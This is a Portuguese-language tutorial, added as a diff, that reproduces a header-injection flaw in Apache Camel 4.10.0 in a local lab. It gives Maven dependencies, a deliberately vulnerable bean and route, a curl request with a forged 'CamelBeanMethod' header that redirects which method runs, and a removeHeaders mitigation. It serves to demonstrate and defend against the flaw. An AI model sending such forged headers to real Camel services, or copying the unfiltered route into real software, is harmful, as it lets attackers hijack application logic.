@@ -1,0 +1,114 @@
+Para simular essa vulnerabilidade em um ambiente controlado, você pode criar um exemplo utilizando o Apache Camel com o camel-http e o camel-bean, mostrando como um cabeçalho HTTP malicioso pode alterar o comportamento esperado da aplicação.
+
+
+---
+
+Passo 1: Configurar um projeto com Apache Camel
+
+Crie um projeto Maven com as dependências necessárias:
+
+<dependencies>
+    <dependency>
+        <groupId>org.apache.camel</groupId>
+        <artifactId>camel-core</artifactId>
+        <version>4.10.0</version> <!-- Versão vulnerável -->
+    </dependency>
+    <dependency>
+        <groupId>org.apache.camel</groupId>
+        <artifactId>camel-http</artifactId>
+        <version>4.10.0</version>
+    </dependency>
+    <dependency>
+        <groupId>org.apache.camel</groupId>
+        <artifactId>camel-servlet</artifactId>
+        <version>4.10.0</version>
+    </dependency>
+    <dependency>
+        <groupId>org.apache.camel</groupId>
+        <artifactId>camel-spring-boot-starter</artifactId>
+        <version>4.10.0</version>
+    </dependency>
+</dependencies>
+
+
+---
+
+Passo 2: Criar um Bean vulnerável
+
+Crie um bean que tenha mais de um método:
+
+import org.apache.camel.Handler;
+import org.springframework.stereotype.Component;
+
+@Component("vulnerableBean")
+public class VulnerableBean {
+
+    @Handler
+    public String safeMethod(String input) {
+        return "Safe response: " + input;
+    }
+
+    public String maliciousMethod(String input) {
+        return "Malicious code executed: " + input;
+    }
+}
+
+
+---
+
+Passo 3: Criar a Rota Camel vulnerável
+
+Configure uma rota que use o camel-bean sem filtragem de cabeçalhos:
+
+import org.apache.camel.builder.RouteBuilder;
+import org.springframework.stereotype.Component;
+
+@Component
+public class VulnerableRoute extends RouteBuilder {
+
+    @Override
+    public void configure() {
+        from("servlet://vulnerable")
+            .routeId("vulnerable-route")
+            .log("Received request with headers: ${headers}")
+            .to("bean:vulnerableBean");
+    }
+}
+
+Aqui, o camel-bean tentará chamar o método safeMethod, mas se um atacante injetar um cabeçalho HTTP malicioso, pode redirecionar a execução para outro método.
+
+
+---
+
+Passo 4: Simular o Ataque
+
+Agora, envie uma requisição HTTP com um cabeçalho forjado, alterando a chamada de método:
+
+curl -X POST "http://localhost:8080/vulnerable" \
+     -H "Content-Type: application/json" \
+     -H "CamelBeanMethod: maliciousMethod" \
+     -d "exploit"
+
+Se a vulnerabilidade estiver presente, a saída do servidor será:
+
+Malicious code executed: exploit
+
+Ou seja, o atacante conseguiu desviar a execução do código e chamar um método diferente do esperado.
+
+
+---
+
+Mitigação
+
+Para evitar esse ataque, remova ou filtre cabeçalhos não autorizados usando o removeHeaders():
+
+from("servlet://vulnerable")
+    .routeId("secure-route")
+    .removeHeaders("CamelBeanMethod")
+    .to("bean:vulnerableBean");
+
+
+---
+
+Esse é um exemplo simples da vulnerabilidade em Apache Camel 4.10.0, mostrando como um atacante pode manipular cabeçalhos HTTP para alterar o fluxo da aplicação.
+
